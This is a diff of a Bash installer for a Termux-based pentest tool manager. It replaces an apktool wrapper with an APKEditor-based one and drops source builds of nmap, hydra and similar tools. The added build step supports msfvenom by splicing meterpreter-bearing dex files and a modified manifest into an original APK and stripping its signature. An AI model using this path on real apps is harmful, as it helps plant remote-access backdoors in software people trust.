-    # reais — era exatamente isso que causava builds de horas).
-    local -A file_defined
-    local f base noext
-    while IFS= read -r -d '' f; do
-        base="\$(basename "\$f")"
-        noext="\${base%.*}"
-        noext="\${noext%.9}"  # arquivos tipo foo.9.png têm dupla extensão
-        file_defined["\$noext"]=1
-    done < <(find "\$proj/res" -type f \( -name "*.xml" -o -name "*.png" -o -name "*.webp" -o -name "*.jpg" \) -print0 2>/dev/null)
+  -version|--version|-v)
+    printf '2.9.3\n'; exit 0 ;;
 
-    # ── índice ÚNICO de recursos "de valor" já definidos em values*.xml ──
-    # (usado tanto aqui quanto pela função de valores — mas cada uma monta
-    # o próprio índice pra não depender de ordem de chamada)
-    local -A value_defined
-    while IFS= read -r pair; do
-        [ -n "\$pair" ] && value_defined["\$pair"]=1
-    done < <(
-        {
-            find "\$proj/res" -path "*/values*/*.xml" ! -name "public.xml" ! -name "xpm-orphan-placeholders.xml" -print0 2>/dev/null \
-              | xargs -0 grep -ohE '<item[^>]*type="[a-zA-Z]+"[^>]*name="[^"]*"' 2>/dev/null \
-              | sed -E 's/.*type="([a-zA-Z]+)".*name="([^"]*)".*/\1:\2/'
-            find "\$proj/res" -path "*/values*/*.xml" ! -name "public.xml" ! -name "xpm-orphan-placeholders.xml" -print0 2>/dev/null \
-              | xargs -0 grep -ohE '<(string|bool|integer|dimen|style|color|drawable|mipmap|anim|animator)[[:space:]]+name="[^"]*"' 2>/dev/null \
-              | sed -E 's/<([a-zA-Z]+)[[:space:]]+name="([^"]*)".*/\1:\2/'
-        }
-    )
-
-    local key type name fixed=0
-    local -A seen
-    while IFS= read -r key; do
-        [ -z "\$key" ] && continue
-        type="\${key%%:*}"
-        name="\${key#*:}"
-
-        [ -n "\${seen[\$key]:-}" ] && continue
-        seen[\$key]=1
-
-        [ -n "\${file_defined[\$name]:-}" ] && continue
-        [ -n "\${value_defined[\$key]:-}" ] && continue
-
-        local target_dir="\$proj/res/\${type}"
-        mkdir -p "\$target_dir"
-        case "\$type" in
-            drawable|mipmap)
-                printf '%s\n' '<?xml version="1.0" encoding="utf-8"?>' '<shape xmlns:android="http://schemas.android.com/apk/res/android" android:shape="rectangle" />' > "\$target_dir/\${name}.xml"
-                ;;
-            anim)
-                printf '%s\n' '<?xml version="1.0" encoding="utf-8"?>' '<alpha xmlns:android="http://schemas.android.com/apk/res/android" android:fromAlpha="1.0" android:toAlpha="1.0" android:duration="1" />' > "\$target_dir/\${name}.xml"
-                ;;
-            animator)
-                printf '%s\n' '<?xml version="1.0" encoding="utf-8"?>' '<set xmlns:android="http://schemas.android.com/apk/res/android" />' > "\$target_dir/\${name}.xml"
-                ;;
-        esac
-        fixed=\$((fixed+1))
-    done < <(
-        grep '<public ' "\$pub_xml" \
-          | grep -E 'type="(drawable|mipmap|anim|animator)"' \
-          | sed -E 's/.*type="([a-zA-Z]+)"[^>]*name="([^"]*)".*/\1:\2/'
-    )
-
-    return 0
-}
-
-# ── auto-fix: mesma ideia, mas pra tipos "de valor" (string/bool/integer/
-# dimen/style/id/color) — a função acima só cobre tipos "de arquivo"
-# (drawable/mipmap/anim/animator). O mesmo resource shrinking de App Bundle
-# que deixa um drawable órfão pode deixar QUALQUER tipo de recurso órfão;
-# cada tipo precisa de um jeito diferente de virar placeholder (arquivo vs.
-# entrada em values). Em vez de espalhar entradas em vários values*.xml
-# existentes (risco de colidir com algo), tudo vai pra um arquivo próprio
-# do xpm, fácil de auditar/remover se precisar.
-_xpm_apktool_fix_orphaned_value_symbols() {
-    local proj="\$1"
-    local pub_xml="\$proj/res/values/public.xml"
-    [ -f "\$pub_xml" ] || return 0
-
-    local out_file="\$proj/res/values/xpm-orphan-placeholders.xml"
-
-    # mesmo índice único usado pela função de tipos de arquivo — reconstruído
-    # aqui porque cada função pode ser chamada independentemente
-    local -A value_defined
-    while IFS= read -r pair; do
-        [ -n "\$pair" ] && value_defined["\$pair"]=1
-    done < <(
-        {
-            find "\$proj/res" -path "*/values*/*.xml" ! -name "public.xml" ! -name "xpm-orphan-placeholders.xml" -print0 2>/dev/null \
-              | xargs -0 grep -ohE '<item[^>]*type="[a-zA-Z]+"[^>]*name="[^"]*"' 2>/dev/null \
-              | sed -E 's/.*type="([a-zA-Z]+)".*name="([^"]*)".*/\1:\2/'
-            find "\$proj/res" -path "*/values*/*.xml" ! -name "public.xml" ! -name "xpm-orphan-placeholders.xml" -print0 2>/dev/null \
-              | xargs -0 grep -ohE '<(string|bool|integer|dimen|style|color|drawable|mipmap|anim|animator)[[:space:]]+name="[^"]*"' 2>/dev/null \
-              | sed -E 's/<([a-zA-Z]+)[[:space:]]+name="([^"]*)".*/\1:\2/'
-        }
-    )
-
-    # ── índice extra só pra tipo "id" ────────────────────────────────────
-    # "id" é o ÚNICO tipo de recurso do Android que pode nascer por USO —
-    # qualquer "android:id=\"@+id/nome\"" em QUALQUER xml do projeto (layout,
-    # menu, xml/, não só res/values/ids.xml) já basta pro aapt2 considerar
-    # esse id definido. Apps de UI de verdade (o Calculator é um exemplo
-    # perfeito) têm centenas de ids de public.xml que só existem assim — sem
-    # esse índice, a função tratava todos como órfãos, criava um <item
-    # type="id"> duplicado em xpm-orphan-placeholders.xml, e o aapt2 recusava
-    # o link com "resource id/X is already defined" apontando o nosso
-    # próprio placeholder como a "definição original". Foi exatamente esse
-    # bug que quebrou o build do calculadora.apk.
-    local -A id_referenced
-    while IFS= read -r idname; do
-        [ -n "\$idname" ] && id_referenced["\$idname"]=1
-    done < <(
-        find "\$proj/res" -type f -name "*.xml" ! -name "public.xml" -print0 2>/dev/null \
-          | xargs -0 grep -ohE '@\+id/[A-Za-z0-9_.]+' 2>/dev/null \
-          | sed -E 's#.*@\+id/##'
-    )
-
-    # ── índice extra só pra tipo "color" ─────────────────────────────────
-    # "color" também é um tipo dual, igual "drawable": pode ser um valor
-    # simples (<color name="x">#fff</color> em values.xml) OU um arquivo
-    # complexo de seletor de estado em res/color*/nome.xml (usado pra cor
-    # que muda com pressed/focused/etc — é o que TODA biblioteca Material
-    # Components/AppCompat usa: abc_*, m3_*, mtrl_*). A função só olhava
-    # values*.xml pra decidir "já definido"; nunca olhava res/color/*.xml.
-    # Resultado: pra QUALQUER app usando essas bibliotecas (ou seja, quase
-    # todo app real), gerava um <color> duplicado pra algo que já existia
-    # como arquivo, e o aapt2 recusava com "has a conflicting value for
-    # configuration ()" apontando o arquivo real como a definição
-    # original. Foi esse o bug real por trás do calculadora.apk e do
-    # Shell.apk falhando em silêncio (o apktool não repassava a mensagem
-    # de erro do aapt2 pro log nessas duas rodadas — motivo à parte, mas
-    # o conflito de recurso sempre foi a causa).
-    local -A color_file_defined
-    while IFS= read -r cname; do
-        [ -n "\$cname" ] && color_file_defined["\$cname"]=1
-    done < <(
-        find "\$proj/res" -path "*/color*/*.xml" -print0 2>/dev/null \
-          | xargs -0 -I{} basename {} .xml 2>/dev/null
-    )
-
-    local body=""
-    local key type name
-    local -A seen
-    while IFS= read -r key; do
-        [ -z "\$key" ] && continue
-        type="\${key%%:*}"
-        name="\${key#*:}"
-
-        [ -n "\${seen[\$key]:-}" ] && continue
-        seen[\$key]=1
-
-        [ -n "\${value_defined[\$key]:-}" ] && continue
-        [ "\$type" = "id" ] && [ -n "\${id_referenced[\$name]:-}" ] && continue
-        [ "\$type" = "color" ] && [ -n "\${color_file_defined[\$name]:-}" ] && continue
-
-        case "\$type" in
-            string)  body="\${body}    <string name=\"\${name}\"></string>"\$'\n' ;;
-            bool)    body="\${body}    <bool name=\"\${name}\">false</bool>"\$'\n' ;;
-            integer) body="\${body}    <integer name=\"\${name}\">0</integer>"\$'\n' ;;
-            dimen)   body="\${body}    <dimen name=\"\${name}\">0dp</dimen>"\$'\n' ;;
-            style)   body="\${body}    <style name=\"\${name}\" />"\$'\n' ;;
-            id)      body="\${body}    <item type=\"id\" name=\"\${name}\" />"\$'\n' ;;
-            color)   body="\${body}    <color name=\"\${name}\">#00000000</color>"\$'\n' ;;
-        esac
-    done < <(
-        grep '<public ' "\$pub_xml" \
-          | grep -E 'type="(string|bool|integer|dimen|style|id|color)"' \
-          | sed -E 's/.*type="([a-zA-Z]+)"[^>]*name="([^"]*)".*/\1:\2/'
-    )
-
-    if [ -n "\$body" ]; then
-        {
-            echo '<?xml version="1.0" encoding="utf-8"?>'
-            echo '<resources>'
-            printf '%s' "\$body"
-            echo '</resources>'
-        } > "\$out_file"
-    else
-        # nada pra colocar (todos os "órfãos" na verdade já estavam cobertos
-        # por @+id ou por um values*.xml) — remove um placeholder de uma
-        # tentativa de build anterior pra não arrastar lixo entre rebuilds
-        # do mesmo diretório decodificado.
-        rm -f "\$out_file"
+  d|decode)
+    shift; _input=""; _output=""; _next_o=0; _force=""
+    for _a in "$@"; do
+      [ "$_next_o" = 1 ] && { _output="$_a"; _next_o=0; continue; }
+      case "$_a" in
+        -o|--output) _next_o=1 ;; -f|--force) _force="-f" ;;
+        --only-main-classes|-r|--no-res|-s|--no-src|-q|--quiet) : ;;
+        -p|--frame-path|-t|--tag|-j|--jobs) _next_o=1 ;;
+        -*) : ;; *) [ -z "$_input" ] && _input="$_a" ;;
+      esac
+    done
+    [ -z "$_input" ] && { printf '[xpm] erro: apktool d — nenhum APK\n' >&2; exit 1; }
+    [ ! -f "$_input" ] && { printf '[xpm] erro: nao encontrado: %s\n' "$_input" >&2; exit 1; }
+    if [ -z "$_output" ]; then
+        _base=$(basename "$_input" .apk)
+        _output="$(dirname "$_input")/${_base}"
     fi
-
-    return 0
-}
-
-# ── auto-fix: recurso "XML" que na real não é XML ───────────────────────
-# Duas causas bem diferentes produzem o MESMO sintoma (aapt2 recusa com
-# "not well-formed (invalid token)" ou crasha tentando nem carregar): (1)
-# limitação antiga e conhecida do decoder do apktool, que às vezes falha
-# em converter um AXML binário de volta pra texto e silenciosamente deixa
-# os bytes crus no lugar — decode "passa" sem avisar; (2) apps com
-# proteção anti-engenharia-reversa deliberada, que fazem o resources.arsc
-# apontar o ID de um recurso (ex: o ícone adaptativo) pra um arquivo real
-# no ZIP que é outra coisa completamente — um PNG de 1x1, por exemplo —
-# sabendo que ferramentas que resolvem recurso "pelo caminho do arquivo"
-# (apktool/aapt2) caem nessa, enquanto o runtime real do Android (que
-# resolve diferente) não é afetado.
-#
-# Não dá pra reverter a causa (2) de forma confiável e genérica sem
-# reimplementar o parser do resources.arsc byte a byte pra essa técnica
-# específica — e isso não generalizaria pra a próxima variante de
-# ofuscação. O que dá pra fazer, e que resolve o problema de verdade pro
-# caso de uso de pentest (conseguir recompilar o APK, nem que seja sem
-# aquele recurso específico fiel ao original): detectar QUALQUER
-# res/**/*.xml que não é texto XML de verdade — decode do apktool sempre
-# produz XML começando com "<?xml" — colocar em quarentena (nunca
-# deletar) e substituir por um placeholder mínimo válido do tipo certo,
-# pra o build conseguir terminar em vez de morrer sem avisar lá na frente.
-_xpm_apktool_fix_corrupted_xml_resources() {
-    local proj="\$1"
-    [ -d "\$proj/res" ] || return 0
-
-    local f head_bytes kind category target_dir quarantined=0
-
-    while IFS= read -r -d '' f; do
-        # pula os arquivos que a gente mesmo gera — sempre válidos por
-        # construção, não precisam ser escaneados
-        case "\$f" in
-            */public.xml|*/xpm-orphan-placeholders.xml) continue ;;
-        esac
-
-        # decode do apktool sempre produz "<?xml" (com possível espaço em
-        # branco/BOM antes) como primeiro texto do arquivo. Qualquer coisa
-        # diferente disso é suspeita.
-        head_bytes="\$(head -c 16 "\$f" 2>/dev/null | tr -d '\\0')"
-        case "\$head_bytes" in
-            *'<?xml'*) continue ;;
-        esac
-
-        # identifica o tipo real pra dar um diagnóstico útil (não afeta o
-        # reparo em si, só ajuda a pessoa a entender o que aconteceu)
-        kind="desconhecido"
-        case "\$(head -c 4 "\$f" 2>/dev/null | od -An -tx1 | tr -d ' \n')" in
-            89504e47) kind="PNG plantado" ;;
-            ffd8ffe0|ffd8ffe1|ffd8ffe2) kind="JPEG plantado" ;;
-            504b0304) kind="ZIP/entrada aninhada plantada" ;;
-            03000800) kind="AXML binário cru (decoder do apktool não converteu)" ;;
-        esac
-
-        mv -f "\$f" "\$f.xpm-quarantine"
-        _xpm_warn_count="\$((\${_xpm_warn_count:-0}+1))"
-        echo "  [XPM] recurso corrompido/adulterado: \${f#\$proj/} (\$kind) — original preservado em \$(basename "\$f").xpm-quarantine" >&2
-
-        category="\$(basename "\$(dirname "\$f")")"
-        category="\${category%%-*}"
-        case "\$category" in
-            drawable|mipmap)
-                printf '%s\n' '<?xml version="1.0" encoding="utf-8"?>' '<shape xmlns:android="http://schemas.android.com/apk/res/android" android:shape="rectangle" />' > "\$f"
-                ;;
-            anim)
-                printf '%s\n' '<?xml version="1.0" encoding="utf-8"?>' '<alpha xmlns:android="http://schemas.android.com/apk/res/android" android:fromAlpha="1.0" android:toAlpha="1.0" android:duration="1" />' > "\$f"
-                ;;
-            animator)
-                printf '%s\n' '<?xml version="1.0" encoding="utf-8"?>' '<set xmlns:android="http://schemas.android.com/apk/res/android" />' > "\$f"
-                ;;
-            menu)
-                printf '%s\n' '<?xml version="1.0" encoding="utf-8"?>' '<menu xmlns:android="http://schemas.android.com/apk/res/android" />' > "\$f"
-                ;;
-            layout)
-                printf '%s\n' '<?xml version="1.0" encoding="utf-8"?>' '<merge xmlns:android="http://schemas.android.com/apk/res/android" />' > "\$f"
-                ;;
-            *)
-                # values*.xml, xml/, etc — container genérico vazio; compila,
-                # mas o conteúdo original desse recurso específico se perde
-                printf '%s\n' '<?xml version="1.0" encoding="utf-8"?>' '<resources />' > "\$f"
-                ;;
-        esac
-        quarantined=\$((quarantined+1))
-    done < <(find "\$proj/res" -type f -name "*.xml" -print0 2>/dev/null)
-
-    if [ "\$quarantined" -gt 0 ]; then
-        echo "  [XPM] \$quarantined recurso(s) XML corrompido(s)/adulterado(s) foram substituídos por placeholders pra permitir o build. Isso É esperado em apps com proteção anti-RE — o conteúdo original desses recursos específicos NÃO está no APK recompilado. Veja os arquivos .xpm-quarantine se precisar investigar." >&2
+    set -- d -i "$_input" -o "$_output" -load-dex 1
+    [ -n "$_force" ] && set -- "$@" -f
+    "$_AE" "$@"; _rc=$?
+    if [ "$_rc" -ne 0 ]; then
+        printf '[xpm] decode APKEditor falhou (exit %d)\n' "$_rc" >&2
+        exit "$_rc"
     fi
-
-    return 0
-}
-
-# ── heap de JVM adaptativo ──────────────────────────────────────────────
-# apktool processa dex/recursos em paralelo (BackgroundWorker) e o heap
-# padrão da JVM (fração fixa da RAM, pensado pra desktop) estoura com
-# OutOfMemoryError em APKs grandes/jogos (250MB+, muitos arquivos dex) —
-# erro recorrente e documentado há anos no projeto oficial, inclusive
-# rodando em Termux especificamente. Um -Xmx fixo também é errado: ou é
-# pouco pra um APK gigante, ou ultrapassa a RAM real de aparelhos mais
-# fracos — nesse segundo caso quem mata o processo é o Android (OOM
-# killer), sem log nenhum, o que é PIOR que um OutOfMemoryError controlado
-# da JVM. Por isso calculamos a partir da RAM realmente disponível agora
-# em /proc/meminfo (sempre presente no kernel Linux, sem exigir pacote
-# extra tipo "procps"/"free"). XPM_APKTOOL_XMX_MB permite override manual.
-_xpm_apktool_pick_xmx() {
-    if [ -n "\${XPM_APKTOOL_XMX_MB:-}" ]; then
-        printf '%s' "\$XPM_APKTOOL_XMX_MB"
-        return
+    # Verifica se o AndroidManifest.xml foi criado (APKEditor pode ser morto por OOM)
+    if [ ! -f "$_output/AndroidManifest.xml" ]; then
+        printf '[xpm] decode: AndroidManifest.xml ausente em %s\n' "$_output" >&2
+        printf '[xpm] conteudo: %s\n' "$(ls "$_output/" 2>/dev/null | tr "\n" " ")" >&2
+        exit 1
     fi
-    local _avail_kb _avail_mb _heap
-    _avail_kb="\$(awk '/^MemAvailable:/{print \$2; f=1} END{if(!f) print ""}' /proc/meminfo 2>/dev/null)"
-    if [ -z "\$_avail_kb" ]; then
-        printf '768'
-        return
-    fi
-    _avail_mb=\$((_avail_kb / 1024))
-    _heap=\$((_avail_mb / 2))
-    [ "\$_heap" -lt 512 ]  && _heap=512
-    [ "\$_heap" -gt 3072 ] && _heap=3072
-    printf '%s' "\$_heap"
-}
+    # Nao normaliza no contexto msfvenom: APKEditor b precisa de smali/classes/
+    [ -z "${BUNDLE_GEMFILE:-}" ] && _ae_normalize_smali "$_output"
+    exit 0 ;;
 
-if [ "\$1" = "b" ] || [ "\$1" = "build" ] || [ "\$1" = "d" ] || [ "\$1" = "decode" ]; then
-    # o alvo é o argumento posicional (não-flag e não-valor-de-flag), ou "."
-    # se nenhum foi passado. IMPORTANTE: várias flags do apktool esperam um
-    # valor logo depois que NÃO começa com "-" (ex: "-o saida.apk",
-    # "-p framework/", "--aapt caminho"). Sem tratar isso, um comando comum
-    # tipo "apktool b projeto -o saida.apk" fazia esse parsing ingênuo
-    # confundir "saida.apk" com o diretório do projeto, e o fix de recursos
-    # "\$"-prefixados rodava no lugar errado (ou não rodava de fato).
-    _value_flags=(-o --output -p --frame-path --aapt -api --api-level)
-    _target="."
-    _skip_next=0
-    for _a in "\${@:2}"; do
-        if [ "\$_skip_next" = "1" ]; then
-            _skip_next=0
-            continue
+  b|build)
+    shift; _input=""; _output=""; _next_o=0; _force=""
+    for _a in "$@"; do
+      [ "$_next_o" = 1 ] && { _output="$_a"; _next_o=0; continue; }
+      case "$_a" in
+        -o|--output) _next_o=1 ;; -f|--force-all) _force="-f" ;;
+        -p|--frame-path|-a|--aapt|-j|--jobs) _next_o=1 ;;
+        -*) : ;; *) [ -z "$_input" ] && _input="$_a" ;;
+      esac
+    done
+    [ -z "$_input" ] && { printf '[xpm] erro: apktool b — nenhuma pasta\n' >&2; exit 1; }
+    [ ! -d "$_input" ] && { printf '[xpm] erro: pasta nao encontrada: %s\n' "$_input" >&2; exit 1; }
+    [ -z "$_output" ] && { mkdir -p "$_input/dist"; _output="$_input/dist/$(basename "$_input").apk"; }
+
+    # Contexto msfvenom: patch cirurgico correto
+    # Base = APK original (preserva .so libs, assets, res, tudo intacto)
+    # Substitui APENAS: dex (com meterpreter) + AndroidManifest.xml (com permissoes)
+    # Extracao via "unzip -p" (pipe) — confiavel, sem glob, sem silencio em erros
+    # Motivo da falha anterior: unzip com glob "*" nao extraia dex silenciosamente
+    _orig_apk="$(dirname "$_input")/$(basename "$_input").apk"
+    if [ -n "${BUNDLE_GEMFILE:-}" ] && [ -f "$_orig_apk" ]; then
+        # Passo 1: APKEditor compila smali → dex (meterpreter incluido)
+        _ae_tmp="$(dirname "$_output")/_ae_$$"
+        # Remove atributos de build nao reconhecidos pelo framework android-23
+        # android:compileSdkVersion e compileSdkVersionCodename sao metadados
+        # adicionados pelo AGP 3.0+ — nao sao necessarios em runtime
+        sed -i 's/ android:compileSdkVersion="[^"]*"//g' "$_input/AndroidManifest.xml" 2>/dev/null || true
+        sed -i 's/ android:compileSdkVersionCodename="[^"]*"//g' "$_input/AndroidManifest.xml" 2>/dev/null || true
+        sed -i 's/ android:roundIcon="[^"]*"//g' "$_input/AndroidManifest.xml" 2>/dev/null || true
+        # Remove dirs v24+ — framework android-23 nao os suporta (patch cirurgico usa resources do APK original)
+        find "$_input/resources" -type d \( -name '*-v2[4-9]' -o -name '*-v[3-9][0-9]' \) \
+            -exec rm -rf {} + 2>/dev/null; true
+        "$_AE" b -i "$_input" -o "$_ae_tmp"; _rc=$?
+        # Fallback iterativo: trata erros de resource e de atributos do manifest
+        # sem esvaziar resources nem raspar o manifest inteiro
+        if [ "$_rc" -ne 0 ] || [ ! -f "$_ae_tmp" ]; then
+            rm -f "$_ae_tmp"
+            _ae_err="$(dirname "$_output")/_ae_err_$$"
+            _retry=0
+            while [ "$_retry" -lt 20 ]; do
+                "$_AE" b -i "$_input" -o "$_ae_tmp" 2>"$_ae_err"; _rc=$?
+                [ "$_rc" -eq 0 ] && [ -f "$_ae_tmp" ] && break
+                # Extrai o arquivo que causou o erro
+                _fail_file=$(awk '/^at \//{gsub(/^at /,""); gsub(/ \[line.*/,""); print; exit}' "$_ae_err" 2>/dev/null)
+                # Extrai atributo desconhecido (android-23 nao conhece roundIcon, etc.)
+                _fail_attr=$(grep "Unknown attribute name" "$_ae_err" 2>/dev/null | sed "s/.*Unknown attribute name '//;s/'.*//" | head -1)
+                case "$_fail_file" in
+                    "$_input"/resources/*)
+                        # Arquivo de resource falhou — remove e tenta de novo
+                        rm -f "$_fail_file" 2>/dev/null ;;
+                    "$_input"/AndroidManifest.xml)
+                        # Atributo desconhecido no manifest — remove só esse atributo
+                        if [ -n "$_fail_attr" ]; then
+                            sed -i "s/ ${_fail_attr}=\"[^\"]*\"//g" "$_input/AndroidManifest.xml" 2>/dev/null
+                        else
+                            break
+                        fi ;;
+                    *) break ;;
+                esac
+                _retry=$((_retry + 1))
+            done
+            rm -f "$_ae_err"
         fi
-        case "\$_a" in
-            -*)
-                for _vf in "\${_value_flags[@]}"; do
-                    if [ "\$_a" = "\$_vf" ]; then
-                        _skip_next=1
-                        break
-                    fi
-                done
-                ;;
-            *)
-                _target="\$_a"
-                ;;
-        esac
-    done
-fi
-
-if [ "\$1" = "b" ] || [ "\$1" = "build" ]; then
-    _xpm_apktool_fix_dollar_resources "\$_target"
-    _xpm_apktool_fix_orphaned_public_symbols "\$_target"
-    _xpm_apktool_fix_orphaned_value_symbols "\$_target"
-    _xpm_apktool_fix_corrupted_xml_resources "\$_target"
-fi
-
-# monta os argumentos extras (aapt/frame-path) só se o usuário não os
-# especificou manualmente — respeita qualquer override explícito. Só se
-# aplica a "d/decode" e "b/build"; outros subcomandos (--version,
-# list-frameworks, publicize-resource, empty-framework-dir...) não aceitam
-# essas flags.
-_extra_args=()
-if [ "\$1" = "b" ] || [ "\$1" = "build" ] || [ "\$1" = "d" ] || [ "\$1" = "decode" ]; then
-    case " \$* " in
-        *" -p "*|*" --frame-path "*) ;;
-        *) _extra_args+=(-p "\$FRAME_DIR") ;;
-    esac
-fi
-
-if [ "\$1" = "b" ] || [ "\$1" = "build" ]; then
-    if [ -n "\$AAPT2_BIN" ]; then
-        case " \$* " in
-            *" --aapt "*) ;;
-            *) _extra_args+=(--aapt "\$AAPT2_BIN") ;;
-        esac
+        if [ "$_rc" -ne 0 ] || [ ! -f "$_ae_tmp" ]; then
+            rm -f "$_ae_tmp"
+            printf '[xpm] build APKEditor falhou (exit %d)\n' "$_rc" >&2
+            exit "${_rc:-1}"
+        fi
+        # Passo 2: extrai dex + manifest do build — arquivo por arquivo (sem glob)
+        _ptmp="$(dirname "$_output")/_patch_$$"
+        mkdir -p "$_ptmp"
+        # Lista os dex no build e extrai cada um individualmente via pipe
+        for _dn in $(unzip -l "$_ae_tmp" 2>/dev/null | awk '/\.dex$/{print $NF}'); do
+            unzip -p "$_ae_tmp" "$_dn" > "$_ptmp/$_dn" 2>/dev/null
+        done
+        unzip -p "$_ae_tmp" AndroidManifest.xml > "$_ptmp/AndroidManifest.xml" 2>/dev/null
+        # Passo 3: copia APK original como base (preserva lib, assets, res, tudo)
+        cp "$_orig_apk" "$_output"
+        # Passo 4: remove entradas antigas e injeta as modificadas
+        cd "$_ptmp"
+        for _f in *.dex AndroidManifest.xml; do
+            [ -f "$_f" ] || continue
+            zip -d "$_output" "$_f" 2>/dev/null || true
+            zip "$_output" "$_f" 2>/dev/null
+        done
+        # Passo 5: remove assinatura velha (apk.rb re-assina depois)
+        zip -d "$_output" "META-INF/*" 2>/dev/null || true
+        cd -
+        rm -rf "$_ptmp" "$_ae_tmp"
+    else
+        # Uso manual ou original nao encontrado: build completo normal
+        "$_AE" b -i "$_input" -o "$_output"; _rc=$?
+        if [ "$_rc" -ne 0 ]; then
+            printf '[xpm] build falhou (exit %d) — use -f para forcar\n' "$_rc" >&2; exit "$_rc"
+        fi
     fi
-fi
+    _ae_sign "$_output" ;;
 
-_XMX_MB="\$(_xpm_apktool_pick_xmx)"
-exec java "-Xmx\${_XMX_MB}m" -jar "\$JAR" "\$@" "\${_extra_args[@]}"
-WEOF
-    chmod +x "$BPFX/bin/apktool"
+  if|install-framework|empty-framework-dir|publicize-framework)
+    printf '[xpm] aviso: "%s" nao suportado — ignorado\n' "$1" >&2; exit 0 ;;
 
-    command -v apktool &>/dev/null || _die "apktool foi instalado mas não está disponível no PATH"
-    _ok "apktool instalado: $(apktool --version 2>/dev/null | head -1 || echo OK)"
+  *) exec "$_AE" "$@" ;;
+
+esac
+APKWEOF
+        sed -i "s|__AE_BIN__|${_rbin_apkeditor}|g" "$_wrapper"
+        sed -i "s|__ATMPDIR__|${_ATMPDIR}|g" "$_wrapper"
+        chmod +x "$_wrapper"
+        rm -f "$HOME/.local/bin/apktool" 2>/dev/null || true
+        _ok "wrapper apktool→APKEditor V2 instalado ($_wrapper)"
+    else
+        _warn "apkeditor nao encontrado — wrapper nao instalado"
+    fi
 }
 
-_backend_source() {
-    local repo="$1" name="$2"
-    local dest="$HOME/.xpm/tools/${name}"
-    local BPFX="${PREFIX:-/data/data/com.termux/files/usr}"
-    local NPROC; NPROC="$(nproc 2>/dev/null || echo 2)"
 
-    _info "Compilando $name a partir do código-fonte (sem apt) — pode demorar"
-    command -v git &>/dev/null || _die "git não encontrado — reinstale a base do ElliotOS"
 
-    # ── Dependências de BUILD (toolchain/libs) — isso continua via pkg/apt.
-    # O que não usamos mais é apt pra instalar a FERRAMENTA em si; compilador,
-    # headers e libs de sistema são infraestrutura, não "pacote pentest".
-    _info "Verificando dependências de compilação para $name..."
-    case "$name" in
-        nmap)
-            pkg install -y clang make pkg-config openssl libpcap 2>/dev/null || true
-            ;;
-        hydra)
-            pkg install -y clang make autoconf automake libtool pkg-config \
-                openssl libssh ncurses 2>/dev/null || true
-            ;;
-        john)
-            pkg install -y clang make autoconf openssl libpcap 2>/dev/null || true
-            ;;
-        radare2)
-            pkg install -y clang make meson ninja pkg-config 2>/dev/null || true
-            ;;
-        yara)
-            pkg install -y clang make autoconf automake libtool pkg-config openssl 2>/dev/null || true
-            ;;
-        nikto)
-            pkg install -y perl 2>/dev/null || true
-            ;;
-        searchsploit)
-            : # só precisa de git + bash, já garantidos no bootstrap
-            ;;
-    esac
+# ── backend apkeditor — APKEditor (decode/rebuild moderno para uso manual) ──
+_backend_apkeditor() {
+    local _APKEDITOR_JAR="$HOME/.xpm/tools/apkeditor/APKEditor.jar"
+    local _APKEDITOR_BIN="${PREFIX:-/data/data/com.termux/files/usr}/bin/apkeditor"
 
-    rm -rf "$dest" 2>/dev/null
-    local _clone_url="https://github.com/${repo}.git"
-    # exploitdb migrou oficialmente pro GitLab; o GitHub só tem um aviso de redirect
-    [ "$name" = "searchsploit" ] && _clone_url="https://gitlab.com/exploit-database/exploitdb.git"
-    git clone --depth=1 "$_clone_url" "$dest" || _die "Falha ao clonar $repo"
+    # tenta via tur-repo primeiro
+    if ! command -v apkeditor >/dev/null 2>&1; then
+        _info "Ativando tur-repo e instalando APKEditor..."
+        if pkg install -y tur-repo 2>/dev/null && pkg update -y 2>/dev/null; then
+            pkg install -y apkeditor 2>/dev/null || true
+        fi
+    fi
 
-    case "$name" in
-        nmap)
-            ( cd "$dest" && ./configure --prefix="$BPFX" \
-                --without-zenmap --without-ndiff --without-nping --without-liblua \
-                && make -j"$NPROC" && make install ) || _die "Falha ao compilar nmap"
-            ;;
-        hydra)
-            ( cd "$dest" && ./configure --prefix="$BPFX" \
-                && make -j"$NPROC" && make install ) || _die "Falha ao compilar hydra"
-            ;;
-        john)
-            ( cd "$dest/src" && ./configure && make -sj"$NPROC" ) || _die "Falha ao compilar john"
-            mkdir -p "$BPFX/share/john"
-            cp -r "$dest/run"/* "$BPFX/share/john/" 2>/dev/null
-            printf '#!/usr/bin/env bash\nexec "%s/share/john/john" "$@"\n' "$BPFX" > "$BPFX/bin/john"
-            chmod +x "$BPFX/bin/john"
-            ;;
-        radare2)
-            ( cd "$dest" && sys/install.sh ) || _die "Falha ao compilar radare2"
-            ;;
-        yara)
-            ( cd "$dest" && ./bootstrap.sh && ./configure --prefix="$BPFX" \
-                && make -j"$NPROC" && make install ) || _die "Falha ao compilar yara"
-            ;;
-        nikto)
-            command -v perl &>/dev/null || _die "perl não encontrado — reinstale a base do ElliotOS"
-            printf '#!/usr/bin/env bash\nexec perl "%s/program/nikto.pl" "$@"\n' "$dest" > "$BPFX/bin/nikto"
-            chmod +x "$BPFX/bin/nikto"
-            ;;
-        searchsploit)
-            chmod +x "$dest/searchsploit" 2>/dev/null
-            printf '#!/usr/bin/env bash\nexec "%s/searchsploit" "$@"\n' "$dest" > "$BPFX/bin/searchsploit"
-            chmod +x "$BPFX/bin/searchsploit"
-            [ -f "$dest/.searchsploit_rc" ] && cp "$dest/.searchsploit_rc" "$HOME/.searchsploit_rc" 2>/dev/null
-            ;;
-        *)
-            _die "Build de origem não definido para $name"
-            ;;
-    esac
+    # fallback: baixa o JAR diretamente do GitHub releases
+    if ! command -v apkeditor >/dev/null 2>&1; then
+        _info "tur-repo não tem apkeditor — baixando JAR do GitHub..."
+        mkdir -p "$(dirname "$_APKEDITOR_JAR")"
+        local _url
+        _url="$(curl -sfL https://api.github.com/repos/REAndroid/APKEditor/releases/latest             | grep 'browser_download_url.*APKEditor.*\.jar"'             | head -1 | cut -d'"' -f4)"
+        if [ -n "$_url" ]; then
+            curl -L -o "$_APKEDITOR_JAR" "$_url" 2>/dev/null                 && _ok "APKEditor.jar baixado"                 || { _warn "Download do APKEditor.jar falhou"; return 1; }
+            # cria wrapper shell
+            printf '#!/bin/sh
+exec java -jar "%s" "$@"
+' "$_APKEDITOR_JAR" > "$_APKEDITOR_BIN"
+            chmod +x "$_APKEDITOR_BIN"
+            _ok "apkeditor wrapper criado em $_APKEDITOR_BIN"
+        else
+            _warn "Não consegui encontrar URL do APKEditor — instale manualmente:"
